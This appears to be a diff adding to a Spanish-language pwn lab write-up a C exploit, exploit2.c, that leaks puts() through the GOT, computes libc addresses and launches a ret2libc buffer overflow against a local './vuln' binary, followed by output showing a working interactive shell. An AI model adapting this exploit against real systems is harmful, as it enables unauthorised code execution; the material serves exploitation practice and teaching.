@@ -254,4 +254,127 @@ has ganado!
 
 ```
 
+``` c
 
+// exploit2.c
+#include <stdio.h>
+#include <string.h>
+#include <unistd.h>
+#include <stdlib.h>
+#include <stdint.h>
+#include <sys/wait.h>
+#include <sys/select.h>
+#include <pty.h>
+
+#define PUTS_PLT    0x08049050
+#define PUTS_GOT    0x0804c008
+#define VULNERABLE  0x080491a1
+
+#define PUTS_OFFSET   0x0007e080
+#define SYSTEM_OFFSET 0x000537f0
+#define EXIT_OFFSET   0x000400c0
+#define BINSH_OFFSET  0x001c8e52
+
+int main() {
+    int in_fd[2];
+    int master, slave;
+
+    pipe(in_fd);
+    openpty(&master, &slave, NULL, NULL, NULL);
+
+    pid_t pid = fork();
+
+    if (pid == 0) {
+        dup2(in_fd[0], STDIN_FILENO);
+        dup2(slave,    STDOUT_FILENO);
+        dup2(slave,    STDERR_FILENO);
+        close(in_fd[0]); close(in_fd[1]);
+        close(master);   close(slave);
+
+        char *args[] = { "./vuln", NULL };
+        execv("./vuln", args);
+        exit(1);
+    }
+
+    close(in_fd[0]);
+    close(slave);
+
+    // ── FASE 1: leak puts() ──────────────────────────────────────
+    unsigned char p1[89];
+    memset(p1, 'A', 76);
+    *(uint32_t*)(p1 + 76) = PUTS_PLT;
+    *(uint32_t*)(p1 + 80) = VULNERABLE;
+    *(uint32_t*)(p1 + 84) = PUTS_GOT;
+    p1[88] = '\n';
+
+    write(in_fd[1], p1, 89);
+
+    unsigned char leaked[5] = {0};
+    read(master, leaked, 5);
+
+    uint32_t puts_real   = *(uint32_t*)leaked;
+    uint32_t libc_base   = puts_real   - PUTS_OFFSET;
+    uint32_t system_addr = libc_base   + SYSTEM_OFFSET;
+    uint32_t exit_addr   = libc_base   + EXIT_OFFSET;
+    uint32_t binsh_addr  = libc_base   + BINSH_OFFSET;
+
+    printf("[*] puts()    leak → 0x%08x\n", puts_real);
+    printf("[*] libc base      → 0x%08x\n", libc_base);
+    printf("[*] system()       → 0x%08x\n", system_addr);
+
+    // ── FASE 2: ret2libc con direcciones reales ──────────────────
+    unsigned char p2[89];
+    memset(p2, 'A', 76);
+    *(uint32_t*)(p2 + 76) = system_addr;
+    *(uint32_t*)(p2 + 80) = exit_addr;
+    *(uint32_t*)(p2 + 84) = binsh_addr;
+    p2[88] = '\n';
+
+    write(in_fd[1], p2, 89);
+    sleep(1);
+
+    // ── Shell interactiva ────────────────────────────────────────
+    printf("[+] shell lista\n");
+    fd_set fds;
+    char buf[256];
+    int n;
+
+    while (1) {
+        FD_ZERO(&fds);
+        FD_SET(STDIN_FILENO, &fds);
+        FD_SET(master, &fds);
+        select(master + 1, &fds, NULL, NULL, NULL);
+
+        if (FD_ISSET(STDIN_FILENO, &fds)) {
+            n = read(STDIN_FILENO, buf, sizeof(buf));
+            if (n <= 0) break;
+            write(in_fd[1], buf, n);
+        }
+        if (FD_ISSET(master, &fds)) {
+            n = read(master, buf, sizeof(buf));
+            if (n <= 0) break;
+            write(STDOUT_FILENO, buf, n);
+        }
+    }
+
+    close(in_fd[1]);
+    waitpid(pid, NULL, 0);
+    return 0;
+}
+
+```
+
+``` bash
+
+❯ ./exploit1
+[*] puts()    leak → 0xf7dc4080
+[*] libc base      → 0xf7d46000
+[*] system()       → 0xf7d997f0
+[+] shell lista
+
+echo "hola"
+hola
+pwd
+/home/joel/pwn
+
+```
